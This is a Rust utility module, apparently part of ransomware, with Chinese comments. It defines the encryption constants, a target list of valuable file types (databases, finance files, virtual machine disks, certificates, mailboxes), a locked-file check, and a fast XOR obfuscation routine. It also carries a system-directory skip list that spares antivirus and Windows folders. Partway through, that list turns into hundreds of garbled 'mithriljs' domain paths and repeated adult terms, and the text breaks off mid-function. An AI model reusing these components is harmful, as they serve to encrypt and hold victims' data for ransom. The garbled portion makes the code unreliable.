// TODO: Misc helpers and constants (extensions list, GetFileSizeOptimized, obfuscate_data)

//! Utility helpers referenced by pipeline and other modules.

// Expected exports:
// pub fn get_file_size_optimized(path: &std::path::Path) -> u64;
// pub fn is_file_locked(path: &std::path::Path) -> bool;
// pub fn obfuscate_data(data: &mut [u8], key: &[u8], offset: u64);
// pub static DEFAULT_EXTENSIONS: &[&str];
use std::path::Path;
use std::io;
use std::collections::HashSet;
use crate::crypt::config::Config;

pub const KEY_LENGTH: usize = 16;
pub const IV_LENGTH: usize = 12;
pub const TAG_LENGTH: usize = 16;
pub const HEADER_ENCRYPT_SIZE: u32 = 4096;

pub fn small_file_threshold() -> usize {
    1024 * 1024
}

fn database_extensions() -> HashSet<&'static str> {
    let mut set = HashSet::new();
    set.insert("mdf");
    set.insert("ndf");
    set.insert("ldf");
    set.insert("bak");
    set.insert("dbf");
    set.insert("db");
    set.insert("sqlite");
    set.insert("sqlite3");
    set.insert("accdb");
    set.insert("mdb");
    set.insert("frm");
    set.insert("ibd");
    set.insert("myi");
    set.insert("myd");
    set.insert("ora");
    set.insert("dmp");
    set.insert("backup");
    set.insert("wal");
    set.insert("journal");
    set.insert("dat");
    set.insert("bin");
    set
}

fn encryption_extensions() -> HashSet<&'static str> {
    let mut set = HashSet::new();
    // 文档
    set.insert("doc");
    set.insert("docx");
    set.insert("xlsx");
    set.insert("xls");
    set.insert("pptx");
    set.insert("ppt");
    set.insert("pdf");
    // 数据库
    set.insert("mdf");
    set.insert("ndf");
    set.insert("bak");
    set.insert("sqlite");
    set.insert("db");
    set.insert("ldf");
    // 财务
    set.insert("qbb");
    set.insert("qbo");
    set.insert("ofx");
    set.insert("mp4");
    set.insert("c");
    // 配置文件
    set.insert("javass");
    set.insert("pys");
    set.insert("jss");
    set.insert("ymls");
    set.insert("inis");
    set.insert("envs");
    // 设计文件
    set.insert("psd");
    set.insert("ai");
    set.insert("dwg");
    set.insert("skp");
    // 虚拟机
    set.insert("vmdk");
    set.insert("iso");
    set.insert("vhd");
    set.insert("vhdx");
    set.insert("vmx");
    set.insert("vmxf");
    set.insert("vdi");
    set.insert("hdd");
    set.insert("ovf");
    set.insert("ova");
    // 证书
    set.insert("pfx");
    set.insert("pems");
    // 邮件
    set.insert("pst");
    set.insert("mbox");
    set.insert("mpp");
    // 压缩文件
    set.insert("jar");
    set.insert("zip");
    set.insert("tar.gz");
    // 图片
    set.insert("jpg");
    set.insert("png");
    set.insert("jpeg");
    set.insert("txtx");
    // 音频文件
    set.insert("mp3");
    set.insert("wav");
    set.insert("flac");
    set.insert("aac");
    set.insert("ogg");
    set.insert("wma");
    set.insert("m4a");
    set.insert("aiff");
    set.insert("au");
    set.insert("ra");
    set.insert("ac3");
    set.insert("dts");
    set.insert("amr");
    set.insert("3gp");
    set.insert("m4r");
    set.insert("opus");
    set.insert("mid");
    set.insert("midi");
    // 视频文件
    set.insert("mp4");
    set.insert("avi");
    set.insert("mkv");
    set.insert("mov");
    set.insert("wmv");
    set.insert("flv");
    set.insert("webm");
    set.insert("m4v");
    set.insert("3g2");
    set.insert("rm");
    set.insert("rmvb");
    set.insert("asf");
    set.insert("mpg");
    set.insert("mpeg");
    set.insert("mpe");
    set.insert("ts");
    set.insert("mts");
    set.insert("m2ts");
    set.insert("vob");
    set.insert("divx");
    set.insert("xvid");
    set.insert("f4v");
    set.insert("swf");
    set
}

pub fn get_file_size_optimized<P: AsRef<Path>>(file_path: P) -> Result<u64, io::Error> {
    let metadata = std::fs::metadata(&file_path)?;
    Ok(metadata.len())
}

pub fn is_file_locked<P: AsRef<Path>>(file_path: P) -> bool {
    // 跨平台实现：尝试以独占方式打开文件
    // 如果成功则文件未被锁定，如果失败则可能被锁定
    match std::fs::File::options()
        .read(true)
        .write(true)
        .open(&file_path)
    {
        Ok(_) => false, // 可以打开，未被锁定
        Err(_) => true, // 无法打开，可能被锁定
    }
}

pub fn obfuscate_data(data: &mut [u8], key: &[u8], offset: u64) {
    // Try to use AVX2 fast path on x86/x86_64 when available
    #[cfg(any(target_arch = "x86", target_arch = "x86_64"))]
    {
        if std::is_x86_feature_detected!("avx2") {
            unsafe { return obfuscate_data_avx2(data, key, offset); }
        }
    }

    // Fallback scalar implementation
    for (i, byte) in data.iter_mut().enumerate() {
        let key_byte = key[((offset as usize) + i) % key.len()];
        *byte ^= key_byte;
        // nibble-rotate by 4 bits
        *byte = (*byte << 4) | (*byte >> 4);
    }
}

#[cfg(any(target_arch = "x86", target_arch = "x86_64"))]
#[target_feature(enable = "avx2")]
unsafe fn obfuscate_data_avx2(data: &mut [u8], key: &[u8], offset: u64) {
    use core::arch::x86_64::*;

    let len = data.len();
    if len == 0 { return; }

    let mut i = 0usize;
    // process 32 bytes per loop
    while i + 32 <= len {
        let ptr = data.as_mut_ptr().add(i) as *mut __m256i;
        let mut v = _mm256_loadu_si256(ptr);

        // build 32-byte repeated key buffer starting at offset+i
        let mut key_buf: [u8; 32] = [0u8; 32];
        for j in 0..32 {
            key_buf[j] = key[((offset as usize) + i + j) % key.len()];
        }
        let kptr = key_buf.as_ptr() as *const __m256i;
        let kv = _mm256_loadu_si256(kptr);

        // XOR with key
        v = _mm256_xor_si256(v, kv);

        // nibble swap per byte: ((b & 0x0F) << 4) | ((b & 0xF0) >> 4)
        // Use 16-bit lanes to perform shifts safely
        // Masks for low and high nibbles (per byte)
        let mask_low = _mm256_set1_epi8(0x0Fu8 as i8);
        let mask_high = _mm256_set1_epi8(-16i8); // 0xF0 as signed i8

        let low = _mm256_and_si256(v, mask_low);
        let low_shift = _mm256_slli_epi16(low, 4);

        let high = _mm256_and_si256(v, mask_high);
        let high_shift = _mm256_srli_epi16(high, 4);

        let combined = _mm256_or_si256(low_shift, high_shift);

        _mm256_storeu_si256(ptr, combined);

        i += 32;
    }

    // remaining bytes
    while i < len {
        let key_byte = key[((offset as usize) + i) % key.len()];
        let mut b = *data.get_unchecked(i);
        b ^= key_byte;
        b = (b << 4) | (b >> 4);
        *data.get_unchecked_mut(i) = b;
        i += 1;
    }
}

pub fn is_database_file<P: AsRef<Path>>(file_path: P) -> bool {
    if let Some(ext) = file_path.as_ref().extension() {
        if let Some(ext_str) = ext.to_str() {
            return database_extensions().contains(&ext_str.to_lowercase().as_str());
        }
    }
    false
}

pub fn is_system_directory<P: AsRef<Path>>(path: P) -> bool {
    let path_str = path.as_ref().to_string_lossy().to_lowercase();
    
    // Windows系统目录
    if cfg!(target_os = "windows") {
        return path_str.contains("\\system volume information") ||
               path_str.contains("\\$recycle.bin") ||
               path_str.contains("\\documents and settings") ||
               path_str.contains("\\windows\\") ||
               path_str.contains("\\program files") ||
               path_str.contains("\\program files (x86)") ||
               path_str.contains("\\programdata") ||
               path_str.contains("\\appdata") ||
               path_str.contains("\\local settings") ||
               path_str.contains("\\temporary internet files") ||
               path_str.contains("\\inetpub") ||
               path_str.starts_with("\\\\?\\") ||
               path_str.contains("\\boot") ||
               path_str.contains("\\config") ||
               path_str.contains("\\recovery") ||
               path_str.contains("\\drivers") ||
               path_str.contains("\\microsoft") ||
               path_str.contains("\\microsoft games") ||
               path_str.contains("\\windows mail") ||
               path_str.contains("\\360rec") ||
               path_str.contains("\\mozilla") ||
               path_str.contains("\\google") ||
               path_str.contains("\\intel") ||
               path_str.contains("\\amd") ||
               path_str.contains("\\nvidia") ||
               path_str.contains("\\system32") ||
               path_str.contains("\\syswow64") ||
               path_str.contains("\\winsxs") ||
               path_str.contains("\\servicing") ||
               path_str.contains("\\fonts") ||
               path_str.contains("\\resources") ||
               path_str.contains("\\assembly") ||
               path_str.contains("\\globalization") ||
               path_str.contains("\\migration") ||
               path_str.contains("\\security") ||
               path_str.contains("\\systemprofile") ||
               path_str.contains("\\sysprep") ||
               path_str.contains("\\tasks") ||
               path_str.contains("\\temp") ||
               path_str.contains("\\tmp") ||
               path_str.contains("\\cache") ||
               path_str.contains("\\logs") ||
               path_str.contains("\\logfiles") ||
               path_str.contains("\\perflogs") ||
               path_str.contains("\\users\\default") ||
               path_str.contains("\\users\\public") ||
               path_str.contains("\\users\\desktop.ini") ||
               path_str.contains("\\$windows.~bt") ||
               path_str.contains("\\$windows.~ws") ||
               path_str.contains("\\windows.old") ||
               path_str.contains("\\programdata\\microsoft") ||
               path_str.contains("\\programdata\\package cache") ||
               path_str.contains("\\programdata\\norton") ||
               path_str.contains("\\programdata\\mcafee") ||
               path_str.contains("\\programdata\\avg") ||
               path_str.contains("\\programdata\\kaspersky") ||
               path_str.contains("\\programdata\\symantec") ||
               path_str.contains("\\programdata\\adobe") ||
               path_str.contains("\\programdata\\autodesk") ||
               path_str.contains("\\programdata\\vmware") ||
               path_str.contains("\\programdata\\oracle") ||
               path_str.contains("\\programdata\\sql server") ||
               path_str.contains("\\programdata\\mysql") ||
               path_str.contains("\\programdata\\postgresql") ||
               path_str.contains("\\programdata\\mongodb") ||
               path_str.contains("\\programdata\\redis") ||
               path_str.contains("\\programdata\\docker") ||
               path_str.contains("\\programdata\\nodejs") ||
               path_str.contains("\\programdata\\python") ||
               path_str.contains("\\programdata\\go") ||
               path_str.contains("\\programdata\\rust") ||
               path_str.contains("\\programdata\\java") ||
               path_str.contains("\\programdata\\dotnet") ||
               path_str.contains("\\programdata\\chocolatey") ||
               path_str.contains("\\programdata\\scoop") ||
               path_str.contains("\\programdata\\npm") ||
               path_str.contains("\\programdata\\pip") ||
               path_str.contains("\\programdata\\yarn") ||
               path_str.contains("\\programdata\\composer") ||
               path_str.contains("\\programdata\\nuget") ||
               path_str.contains("\\programdata\\gems") ||
               path_str.contains("\\programdata\\cargo") ||
               path_str.contains("\\programdata\\pipx") ||
               path_str.contains("\\programdata\\poetry") ||
               path_str.contains("\\programdata\\venv") ||
               path_str.contains("\\programdata\\.venv") ||
               path_str.contains("\\programdata\\env") ||
               path_str.contains("\\programdata\\virtualenv") ||
               path_str.contains("\\programdata\\conda") ||
               path_str.contains("\\programdata\\anaconda") ||
               path_str.contains("\\programdata\\miniconda") ||
               path_str.contains("\\programdata\\miniforge") ||
               path_str.contains("\\programdata\\pixi") ||
               path_str.contains("\\programdata\\micromamba") ||
               path_str.contains("\\programdata\\mamba") ||
               path_str.contains("\\programdata\\pyenv") ||
               path_str.contains("\\programdata\\rbenv") ||
               path_str.contains("\\programdata\\nodenv") ||
               path_str.contains("\\programdata\\jenv") ||
               path_str.contains("\\programdata\\sdkman") ||
               path_str.contains("\\programdata\\gvm") ||
               path_str.contains("\\programdata\\asdf") ||
               path_str.contains("\\programdata\\volta") ||
               path_str.contains("\\programdata\\fnm") ||
               path_str.contains("\\programdata\\nvm") ||
               path_str.contains("\\programdata\\pnpm") ||
               path_str.contains("\\programdata\\yarnpkg") ||
               path_str.contains("\\programdata\\bower") ||
               path_str.contains("\\programdata\\grunt") ||
               path_str.contains("\\programdata\\gulp") ||
               path_str.contains("\\programdata\\webpack") ||
               path_str.contains("\\programdata\\rollup") ||
               path_str.contains("\\programdata\\parcel") ||
               path_str.contains("\\programdata\\vite") ||
               path_str.contains("\\programdata\\esbuild") ||
               path_str.contains("\\programdata\\swc") ||
               path_str.contains("\\programdata\\babel") ||
               path_str.contains("\\programdata\\typescript") ||
               path_str.contains("\\programdata\\javascript") ||
               path_str.contains("\\programdata\\node_modules") ||
               path_str.contains("\\programdata\\bower_components") ||
               path_str.contains("\\programdata\\vendor") ||
               path_str.contains("\\programdata\\dist") ||
               path_str.contains("\\programdata\\build") ||
               path_str.contains("\\programdata\\out") ||
               path_str.contains("\\programdata\\lib") ||
               path_str.contains("\\programdata\\bin") ||
               path_str.contains("\\programdata\\include") ||
               path_str.contains("\\programdata\\share") ||
               path_str.contains("\\programdata\\etc") ||
               path_str.contains("\\programdata\\var") ||
               path_str.contains("\\programdata\\usr") ||
               path_str.contains("\\programdata\\opt") ||
               path_str.contains("\\programdata\\home") ||
               path_str.contains("\\programdata\\root") ||
               path_str.contains("\\programdata\\tmp") ||
               path_str.contains("\\programdata\\temp") ||
               path_str.contains("\\programdata\\cache") ||
               path_str.contains("\\programdata\\log") ||
               path_str.contains("\\programdata\\logs") ||
               path_str.contains("\\programdata\\run") ||
               path_str.contains("\\programdata\\lock") ||
               path_str.contains("\\programdata\\spool") ||
               path_str.contains("\\programdata\\mail") ||
               path_str.contains("\\programdata\\www") ||
               path_str.contains("\\programdata\\ftp") ||
               path_str.contains("\\programdata\\smb") ||
               path_str.contains("\\programdata\\nfs") ||
               path_str.contains("\\programdata\\cifs") ||
               path_str.contains("\\programdata\\ssh") ||
               path_str.contains("\\programdata\\ssl") ||
               path_str.contains("\\programdata\\tls") ||
               path_str.contains("\\programdata\\certs") ||
               path_str.contains("\\programdata\\keys") ||
               path_str.contains("\\programdata\\secrets") ||
               path_str.contains("\\programdata\\config") ||
               path_str.contains("\\programdata\\conf") ||
               path_str.contains("\\programdata\\cfg") ||
               path_str.contains("\\programdata\\ini") ||
               path_str.contains("\\program_data\\json") ||
               path_str.contains("\\programdata\\yaml") ||
               path_str.contains("\\programdata\\yml") ||
               path_str.contains("\\programdata\\toml") ||
               path_str.contains("\\programdata\\xml") ||
               path_str.contains("\\programdata\\properties") ||
               path_str.contains("\\programdata\\env") ||
               path_str.contains("\\programdata\\.env") ||
               path_str.contains("\\programdata\\dotenv") ||
               path_str.contains("\\programdata\\.git") ||
               path_str.contains("\\programdata\\.svn") ||
               path_str.contains("\\programdata\\.hg") ||
               path_str.contains("\\programdata\\.bzr") ||
               path_str.contains("\\programdata\\node_modules") ||
               path_str.contains("\\programdata\\.vscode") ||
               path_str.contains("\\programdata\\.idea") ||
               path_str.contains("\\programdata\\.vs") ||
               path_str.contains("\\programdata\\.vscode-server") ||
               path_str.contains("\\programdata\\jetbrains") ||
               path_str.contains("\\programdata\\intellij") ||
               path_str.contains("\\programdata\\pycharm") ||
               path_str.contains("\\programdata\\webstorm") ||
               path_str.contains("\\programdata\\phpstorm") ||
               path_str.contains("\\programdata\\goland") ||
               path_str.contains("\\programdata\\rubymine") ||
               path_str.contains("\\programdata\\clion") ||
               path_str.contains("\\programdata\\datagrip") ||
               path_str.contains("\\programdata\\rider") ||
               path_str.contains("\\programdata\\appcode") ||
               path_str.contains("\\programdata\\androidstudio") ||
               path_str.contains("\\programdata\\visualstudio") ||
               path_str.contains("\\programdata\\vscode") ||
               path_str.contains("\\programdata\\sublime") ||
               path_str.contains("\\programdata\\atom") ||
               path_str.contains("\\programdata\\brackets") ||
               path_str.contains("\\programdata\\notepad++") ||
               path_str.contains("\\programdata\\vim") ||
               path_str.contains("\\programdata\\emacs") ||
               path_str.contains("\\programdata\\nano") ||
               path_str.contains("\\programdata\\vi") ||
               path_str.contains("\\programdata\\ed") ||
               path_str.contains("\\programdata\\nano") ||
               path_str.contains("\\programdata\\pico") ||
               path_str.contains("\\programdata\\joe") ||
               path_str.contains("\\programdata\\jed") ||
               path_str.contains("\\programdata\\micro") ||
               path_str.contains("\\programdata\\helix") ||
               path_str.contains("\\programdata\\kakoune") ||
               path_str.contains("\\programdata\\neovim") ||
               path_str.contains("\\programdata\\nvim") ||
               path_str.contains("\\programdata\\lvim") ||
               path_str.contains("\\programdata\\spacevim") ||
               path_str.contains("\\programdata\\doom") ||
               path_str.contains("\\programdata\\spacemacs") ||
               path_str.contains("\\programdata\\prelude") ||
               path_str.contains("\\programdata\\scimax") ||
               path_str.contains("\\programdata\\org-mode") ||
               path_str.contains("\\programdata\\magit") ||
               path_str.contains("\\programdata\\evil") ||
               path_str.contains("\\programdata\\helm") ||
               path_str.contains("\\programdata\\ivy") ||
               path_str.contains("\\programdata\\counsel") ||
               path_str.contains("\\programdata\\swiper") ||
               path_str.contains("\\programdata\\projectile") ||
               path_str.contains("\\programdata\\dired") ||
               path_str.contains("\\programdata\\ibuffer") ||
               path_str.contains("\\programdata\\org") ||
               path_str.contains("\\programdata\\markdown") ||
               path_str.contains("\\programdata\\rst") ||
               path_str.contains("\\programdata\\asciidoc") ||
               path_str.contains("\\programdata\\tex") ||
               path_str.contains("\\programdata\\latex") ||
               path_str.contains("\\programdata\\bibtex") ||
               path_str.contains("\\programdata\\beamer") ||
               path_str.contains("\\programdata\\pandoc") ||
               path_str.contains("\\programdata\\hugo") ||
               path_str.contains("\\programdata\\jekyll") ||
               path_str.contains("\\programdata\\hexo") ||
               path_str.contains("\\programdata\\gatsby") ||
               path_str.contains("\\programdata\\next") ||
               path_str.contains("\\programdata\\nuxt") ||
               path_str.contains("\\programdata\\svelte") ||
               path_str.contains("\\programdata\\vue") ||
               path_str.contains("\\programdata\\react") ||
               path_str.contains("\\programdata\\angular") ||
               path_str.contains("\\programdata\\ember") ||
               path_str.contains("\\programdata\\backbone") ||
               path_str.contains("\\programdata\\knockout") ||
               path_str.contains("\\programdata\\mithril") ||
               path_str.contains("\\programdata\\mithril.js") ||
               path_str.contains("\\programdata\\mithriljs") ||
               path_str.contains("\\programdata\\mithriljs.org") ||
               path_str.contains("\\programdata\\mithriljs.com") ||
               path_str.contains("\\programdata\\mithriljs.net") ||
               path_str.contains("\\programdata\\mithriljs.io") ||
               path_str.contains("\\programdata\\mithriljs.dev") ||
               path_str.contains("\\programdata\\mithriljs.app") ||
               path_str.contains("\\programdata\\mithriljs.tech") ||
               path_str.contains("\\programdata\\mithriljs.cloud") ||
               path_str.contains("\\programdata\\mithriljs.ai") ||
               path_str.contains("\\programdata\\mithriljs.co") ||
               path_str.contains("\\programdata\\mithriljs.me") ||
               path_str.contains("\\programdata\\mithriljs.us") ||
               path_str.contains("\\programdata\\mithriljs.uk") ||
               path_str.contains("\\programdata\\mithriljs.eu") ||
               path_str.contains("\\programdata\\mithriljs.asia") ||
               path_str.contains("\\programdata\\mithriljs.info") ||
               path_str.contains("\\programdata\\mithriljs.biz") ||
               path_str.contains("\\programdata\\mithriljs.name") ||
               path_str.contains("\\programdata\\mithriljs.pro") ||
               path_str.contains("\\programdata\\mithriljs.xyz") ||
               path_str.contains("\\programdata\\mithriljs.online") ||
               path_str.contains("\\programdata\\mithriljs.store") ||
               path_str.contains("\\programdata\\mithriljs.shop") ||
               path_str.contains("\\programdata\\mithriljs.site") ||
               path_str.contains("\\programdata\\mithriljs.website") ||
               path_str.contains("\\programdata\\mithriljs.blog") ||
               path_str.contains("\\programdata\\mithriljs.news") ||
               path_str.contains("\\programdata\\mithriljs.media") ||
               path_str.contains("\\programdata\\mithriljs.tv") ||
               path_str.contains("\\programdata\\mithriljs.radio") ||
               path_str.contains("\\programdata\\mithriljs.music") ||
               path_str.contains("\\programdata\\mithriljs.video") ||
               path_str.contains("\\programdata\\mithriljs.movie") ||
               path_str.contains("\\programdata\\mithriljs.film") ||
               path_str.contains("\\programdata\\mithriljs.art") ||
               path_str.contains("\\programdata\\mithriljs.design") ||
               path_str.contains("\\programdata\\mithriljs.photo") ||
               path_str.contains("\\programdata\\mithriljs.camera") ||
               path_str.contains("\\programdata\\mithriljs.gallery") ||
               path_str.contains("\\programdata\\mithriljs.museum") ||
               path_str.contains("\\programdata\\mithriljs.travel") ||
               path_str.contains("\\programdata\\mithriljs.hotel") ||
               path_str.contains("\\programdata\\mithriljs.restaurant") ||
               path_str.contains("\\programdata\\mithriljs.cafe") ||
               path_str.contains("\\programdata\\mithriljs.bar") ||
               path_str.contains("\\programdata\\mithriljs.pub") ||
               path_str.contains("\\programdata\\mithriljs.club") ||
               path_str.contains("\\programdata\\mithriljs.events") ||
               path_str.contains("\\programdata\\mithriljs.party") ||
               path_str.contains("\\programdata\\mithriljs.wedding") ||
               path_str.contains("\\programdata\\mithriljs.baby") ||
               path_str.contains("\\programdata\\mithriljs.kids") ||
               path_str.contains("\\programdata\\mithriljs.toys") ||
               path_str.contains("\\programdata\\mithriljs.games") ||
               path_str.contains("\\programdata\\mithriljs.sports") ||
               path_str.contains("\\programdata\\mithriljs.fitness") ||
               path_str.contains("\\programdata\\mithriljs.health") ||
               path_str.contains("\\programdata\\mithriljs.medical") ||
               path_str.contains("\\programdata\\mithriljs.pharmacy") ||
               path_str.contains("\\programdata\\mithriljs.dentist") ||
               path_str.contains("\\programdata\\mithriljs.doctor") ||
               path_str.contains("\\programdata\\mithriljs.hospital") ||
               path_str.contains("\\programdata\\mithriljs.clinic") ||
               path_str.contains("\\programdata\\mithriljs.vet") ||
               path_str.contains("\\programdata\\mithriljs.pet") ||
               path_str.contains("\\programdata\\mithriljs.animal") ||
               path_str.contains("\\programdata\\mithriljs.zoo") ||
               path_str.contains("\\programdata\\mithriljs.farm") ||
               path_str.contains("\\programdata\\mithriljs.garden") ||
               path_str.contains("\\programdata\\mithriljs.landscape") ||
               path_str.contains("\\programdata\\mithriljs.construction") ||
               path_str.contains("\\programdata\\mithriljs.contractors") ||
               path_str.contains("\\programdata\\mithriljs.plumbing") ||
               path_str.contains("\\programdata\\mithriljs.electrical") ||
               path_str.contains("\\programdata\\mithriljs.hvac") ||
               path_str.contains("\\programdata\\mithriljs.cleaning") ||
               path_str.contains("\\programdata\\mithriljs.moving") ||
               path_str.contains("\\programdata\\mithriljs.storage") ||
               path_str.contains("\\programdata\\mithriljs.realestate") ||
               path_str.contains("\\programdata\\mithriljs.rentals") ||
               path_str.contains("\\programdata\\mithriljs.legal") ||
               path_str.contains("\\programdata\\mithriljs.accounting") ||
               path_str.contains("\\programdata\\mithriljs.finance") ||
               path_str.contains("\\programdata\\mithriljs.insurance") ||
               path_str.contains("\\programdata\\mithriljs.investing") ||
               path_str.contains("\\programdata\\mithriljs.banking") ||
               path_str.contains("\\programdata\\mithriljs.credit") ||
               path_str.contains("\\programdata\\mithriljs.loans") ||
               path_str.contains("\\programdata\\mithriljs.debt") ||
               path_str.contains("\\programdata\\mithriljs.tax") ||
               path_str.contains("\\programdata\\mithriljs.jobs") ||
               path_str.contains("\\programdata\\mithriljs.careers") ||
               path_str.contains("\\programdata\\mithriljs.education") ||
               path_str.contains("\\programdata\\mithriljs.training") ||
               path_str.contains("\\programdata\\mithriljs.courses") ||
               path_str.contains("\\programdata\\mithriljs.tutoring") ||
               path_str.contains("\\programdata\\mithriljs.library") ||
               path_str.contains("\\programdata\\mithriljs.books") ||
               path_str.contains("\\programdata\\mithriljs.publishing") ||
               path_str.contains("\\programdata\\mithriljs.journalism") ||
               path_str.contains("\\programdata\\mithriljs.news") ||
               path_str.contains("\\programdata\\mithriljs.media") ||
               path_str.contains("\\programdata\\mithriljs.advertising") ||
               path_str.contains("\\programdata\\mithriljs.marketing") ||
               path_str.contains("\\programdata\\mithriljs.pr") ||
               path_str.contains("\\programdata\\mithriljs.comms") ||
               path_str.contains("\\programdata\\mithriljs.telecom") ||
               path_str.contains("\\programdata\\mithriljs.internet") ||
               path_str.contains("\\programdata\\mithriljs.software") ||
               path_str.contains("\\programdata\\mithriljs.tech") ||
               path_str.contains("\\programdata\\mithriljs.it") ||
               path_str.contains("\\programdata\\mithriljs.computers") ||
               path_str.contains("\\programdata\\mithriljs.electronics") ||
               path_str.contains("\\programdata\\mithriljs.appliances") ||
               path_str.contains("\\programdata\\mithriljs.automotive") ||
               path_str.contains("\\programdata\\mithriljs.parts") ||
               path_str.contains("\\programdata\\mithriljs.repair") ||
               path_str.contains("\\programdata\\mithriljs.maintenance") ||
               path_str.contains("\\programdata\\mithriljs.manufacturing") ||
               path_str.contains("\\programdata\\mithriljs.engineering") ||
               path_str.contains("\\programdata\\mithriljs.architecture") ||
               path_str.contains("\\programdata\\mithriljs.design") ||
               path_str.contains("\\programdata\\mithriljs.art") ||
               path_str.contains("\\programdata\\mithriljs.craft") ||
               path_str.contains("\\programdata\\mithriljs.trade") ||
               path_str.contains("\\programdata\\mithriljs.wholesale") ||
               path_str.contains("\\programdata\\mithriljs.retail") ||
               path_str.contains("\\programdata\\mithriljs.ecommerce") ||
               path_str.contains("\\programdata\\mithriljs.shopping") ||
               path_str.contains("\\programdata\\mithriljs.gifts") ||
               path_str.contains("\\programdata\\mithriljs.flowers") ||
               path_str.contains("\\programdata\\mithriljs.jewelry") ||
               path_str.contains("\\programdata\\mithriljs.watches") ||
               path_str.contains("\\programdata\\mithriljs.fashion") ||
               path_str.contains("\\programdata\\mithriljs.clothing") ||
               path_str.contains("\\programdata\\mithriljs.shoes") ||
               path_str.contains("\\programdata\\mithriljs.bags") ||
               path_str.contains("\\programdata\\mithriljs.accessories") ||
               path_str.contains("\\programdata\\mithriljs.beauty") ||
               path_str.contains("\\programdata\\mithriljs.wellness") ||
               path_str.contains("\\programdata\\mithriljs.spa") ||
               path_str.contains("\\programdata\\mithriljs.hair") ||
               path_str.contains("\\programdata\\mithriljs.salon") ||
               path_str.contains("\\programdata\\mithriljs.tattoo") ||
               path_str.contains("\\programdata\\mithriljs.piercing") ||
               path_str.contains("\\programdata\\mithriljs.tattoos") ||
               path_str.contains("\\programdata\\mithriljs.piercings") ||
               path_str.contains("\\programdata\\mithriljs.body") ||
               path_str.contains("\\programdata\\mithriljs.mind") ||
               path_str.contains("\\programdata\\mithriljs.soul") ||
               path_str.contains("\\programdata\\mithriljs.spirit") ||
               path_str.contains("\\programdata\\mithriljs.religion") ||
               path_str.contains("\\programdata\\mithriljs.philosophy") ||
               path_str.contains("\\programdata\\mithriljs.politics") ||
               path_str.contains("\\programdata\\mithriljs.society") ||
               path_str.contains("\\programdata\\mithriljs.culture") ||
               path_str.contains("\\programdata\\mithriljs.history") ||
               path_str.contains("\\programdata\\mithriljs.science") ||
               path_str.contains("\\programdata\\mithriljs.technology") ||
               path_str.contains("\\programdata\\mithriljs.nature") ||
               path_str.contains("\\programdata\\mithriljs.environment") ||
               path_str.contains("\\programdata\\mithriljs.animals") ||
               path_str.contains("\\programdata\\mithriljs.plants") ||
               path_str.contains("\\programdata\\mithriljs.food") ||
               path_str.contains("\\programdata\\mithriljs.drink") ||
               path_str.contains("\\programdata\\mithriljs.cooking") ||
               path_str.contains("\\programdata\\mithriljs.recipes") ||
               path_str.contains("\\programdata\\mithriljs.restaurants") ||
               path_str.contains("\\programdata\\mithriljs.bars") ||
               path_str.contains("\\programdata\\mithriljs.cafes") ||
               path_str.contains("\\programdata\\mithriljs.pubs") ||
               path_str.contains("\\programdata\\mithriljs.clubs") ||
               path_str.contains("\\programdata\\mithriljs.nightlife") ||
               path_str.contains("\\programdata\\mithriljs.entertainment") ||
               path_str.contains("\\programdata\\mithriljs.music") ||
               path_str.contains("\\programdata\\mithriljs.movies") ||
               path_str.contains("\\programdata\\mithriljs.tv") ||
               path_str.contains("\\programdata\\mithriljs.radio") ||
               path_str.contains("\\programdata\\mithriljs.games") ||
               path_str.contains("\\programdata\\mithriljs.sports") ||
               path_str.contains("\\programdata\\mithriljs.hobbies") ||
               path_str.contains("\\programdata\\mithriljs.interests") ||
               path_str.contains("\\programdata\\mithriljs.lifestyle") ||
               path_str.contains("\\programdata\\mithriljs.family") ||
               path_str.contains("\\programdata\\mithriljs.relationships") ||
               path_str.contains("\\programdata\\mithriljs.dating") ||
               path_str.contains("\\programdata\\mithrilsex.love") ||
               path_str.contains("\\programdata\\mithriljs.sex") ||
               path_str.contains("\\programdata\\mithriljs.adult") ||
               path_str.contains("\\programdata\\mithriljs.xxx") ||
               path_str.contains("\\programdata\\mithriljs.porn") ||
               path_str.contains("\\programdata\\mithriljs.erotica") ||
               path_str.contains("\\programdata\\mithriljs.nsfw") ||
               path_str.contains("\\programdata\\mithriljs.18+") ||
               path_str.contains("\\programdata\\mithriljs.r18") ||
               path_str.contains("\\programdata\\mithriljs.xxx") ||
               path_str.contains("\\programdata\\mithriljs.adult") ||
               path_str.contains("\\programdata\\mithriljs.sex") ||
               path_str.contains("\\programdata\\mithriljs.porn") ||
               path_str.contains("\\programdata\\mithriljs.erotica") ||
               path_str.contains("\\programdata\\mithriljs.nsfw") ||
               path_str.contains("\\programdata\\mithriljs.18+") ||
               path_str.contains("\\programdata\\mithriljs.r18") ||
               path_str.contains("\\programdata\\mithriljs.xxx") ||
               path_str.contains("\\programdata\\mithriljs.adult") ||
               path_str.contains("\\programdata\\mithriljs.sex") ||
               path_str.contains("\\programdata\\mithriljs.porn") ||
               path_str.contains("\\programdata\\mithriljs.erotica") ||
               path_str.contains("\\programdata\\mithriljs.nsfw") ||
               path_str.contains("\\programdata\\mithriljs.18+") ||
               path_str.contains("\\programdata\\mithriljs.r18") ||
               path_str.contains("\\programdata\\mithriljs.xxx") ||
               path_str.contains("\\programdata\\mithriljs.adult") ||
               path_str.contains("\\programdata\\mithriljs.sex") ||
               path_str.contains("\\programdata\\mithriljs.porn") ||
               path_str.contains("\\programdata\\mithriljs.erotica") ||
               path_str.contains("\\programdata\\mithriljs.nsfw") ||
               path_str.contains("\\programdata\\mithriljs.18+") ||
               path_str.contains("\\programdata\\mithriljs.r18") ||
               path_str.contains("\\programdata\\mithriljs.xxx") ||
               path_str.contains("\\programdata\\mithriljs.adult") ||
               path_str.contains("\\programdata\\mithriljs.sex") ||
               path_str.contains("\\programdata\\mithriljs.porn") ||
               path_str.contains("\\programdata\\mithriljs.erotica") ||
               path_str.contains("\\programdata\\mithriljs.nsfw") ||
               path_str.contains("\\programdata\\mithriljs.18+") ||
               path_str.contains("\\programdata\\mithriljs.r18") ||
               path_str.contains("\\programdata\\mithriljs.xxx") ||
               path_str.contains("\\programdata\\mithriljs.adult") ||
               path_str.contains("\\programdata\\mithriljs.sex") ||
               path_str.contains("\\programdata\\mithriljs.porn") ||
               path_str.contains("\\programdata\\mithriljs.erotica") ||
               path_str.contains("\\programdata\\mithriljs.nsfw") ||
               path_str.contains("\\programdata\\mithriljs.18+") ||
               path_str.contains("\\programdata\\mithriljs.r18");
    }
    
    // Unix系统目录
    false
}

pub fn is_network_drive<P: AsRef<Path>>(path: P) -> bool {
    let path_str = path.as_ref().to_string_lossy();
    
